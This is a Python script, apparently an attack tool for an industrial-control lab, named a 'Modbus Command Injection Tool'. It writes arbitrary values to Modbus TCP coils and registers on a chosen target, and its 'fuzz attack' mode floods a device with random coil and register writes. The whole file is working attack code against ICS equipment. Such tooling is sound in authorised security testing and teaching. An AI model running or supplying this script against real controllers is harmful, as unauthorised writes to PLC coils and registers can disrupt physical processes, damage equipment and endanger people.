
import sys
import argparse
import random
import time
from pymodbus.client import ModbusTcpClient

def write_coil(target_ip, target_port, unit_id, address, value):
    """Write to a Single Coil (Function 05)."""
    client = ModbusTcpClient(target_ip, port=target_port)
    if client.connect():
        print(f"[*] Connected to {target_ip}:{target_port} (Unit {unit_id})")
        print(f"[*] Writing Coil {address} = {value}")
        try:
            try:
                rq = client.write_coil(address, value, slave=unit_id)
            except TypeError:
                 rq = client.write_coil(address, value, unit=unit_id)
            
            if rq.isError():
                print(f"[-] Error writing coil: {rq}")
            else:
                print(f"[+] Write Successful!")
        except Exception as e:
            print(f"[-] Exception: {e}")
        client.close()
    else:
        print(f"[-] Failed to connect to {target_ip}:{target_port}")

def write_register(target_ip, target_port, unit_id, address, value):
    """Write to a Single Register (Function 06)."""
    client = ModbusTcpClient(target_ip, port=target_port)
    if client.connect():
        print(f"[*] Connected to {target_ip}:{target_port} (Unit {unit_id})")
        print(f"[*] Writing Register {address} = {value}")
        try:
            try:
                rq = client.write_register(address, value, slave=unit_id)
            except TypeError:
                rq = client.write_register(address, value, unit=unit_id)
                
            if rq.isError():
                print(f"[-] Error writing register: {rq}")
            else:
                print(f"[+] Write Successful!")
        except Exception as e:
            print(f"[-] Exception: {e}")
        client.close()
    else:
        print(f"[-] Failed to connect to {target_ip}:{target_port}")

def fuzz_attack(target_ip, target_port, unit_id, count):
    """Randomly write to coils and registers."""
    client = ModbusTcpClient(target_ip, port=target_port)
    if client.connect():
        print(f"[*] Starting Fuzzing Attack on {target_ip}:{target_port} (Unit {unit_id})")
        for i in range(count):
            try:
                # Randomly choose between Coil (05) and Register (06)
                if random.choice([True, False]):
                    addr = random.randint(0, 10)
                    val = random.choice([True, False])
                    print(f"    [{i+1}/{count}] Writing Coil {addr} = {val}")
                    try:
                        client.write_coil(addr, val, slave=unit_id)
                    except TypeError:
                        client.write_coil(addr, val, unit=unit_id)
                else:
                    addr = random.randint(0, 10)
                    val = random.randint(0, 65535)
                    print(f"    [{i+1}/{count}] Writing Register {addr} = {val}")
                    try:
                        client.write_register(addr, val, slave=unit_id)
                    except TypeError:
                        client.write_register(addr, val, unit=unit_id)
                time.sleep(0.1)
            except Exception as e:
                print(f"    [-] Error: {e}")
        client.close()
    else:
        print(f"[-] Failed to connect to {target_ip}:{target_port}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Modbus Command Injection Tool")
    parser.add_argument("--target", default="localhost", help="Target IP address")
    parser.add_argument("--port", type=int, default=5002, help="Target Port (default: 5002)")
    parser.add_argument("--unit", type=int, default=1, help="Modbus Unit ID (default: 1)")
    
    subparsers = parser.add_subparsers(dest="command", help="Command to execute")
    
    # Write Coil Command
    coil_parser = subparsers.add_parser("write-coil", help="Write to a coil (Function 05)")
    coil_parser.add_argument("address", type=int, help="Coil Address")
    coil_parser.add_argument("value", type=int, choices=[0, 1], help="Value (0 or 1)")
    
    # Write Register Command
    reg_parser = subparsers.add_parser("write-reg", help="Write to a register (Function 06)")
    reg_parser.add_argument("address", type=int, help="Register Address")
    reg_parser.add_argument("value", type=int, help="Value (0-65535)")

    # Fuzz Command
    fuzz_parser = subparsers.add_parser("fuzz", help="Randomly write to coils/registers")
    fuzz_parser.add_argument("--count", type=int, default=100, help="Number of random writes")

    args = parser.parse_args()

    if args.command == "write-coil":
        write_coil(args.target, args.port, args.unit, args.address, args.value)
    elif args.command == "write-reg":
        write_register(args.target, args.port, args.unit, args.address, args.value)
    elif args.command == "fuzz":
        fuzz_attack(args.target, args.port, args.unit, args.count)
    else:
        parser.print_help()
